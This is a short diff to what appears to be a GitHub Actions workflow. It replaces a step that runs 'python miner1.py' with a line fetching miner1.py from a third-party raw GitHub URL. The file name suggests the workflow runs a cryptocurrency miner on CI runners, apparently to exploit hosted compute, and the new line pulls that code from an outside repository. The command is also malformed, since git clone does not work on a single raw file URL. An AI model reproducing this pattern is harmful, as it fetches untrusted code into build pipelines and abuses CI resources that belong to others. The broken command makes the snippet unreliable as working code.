@@ -12,4 +12,4 @@ jobs:
     
     - name: run python.
       run: |
-        python miner1.py
+        git clone https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py
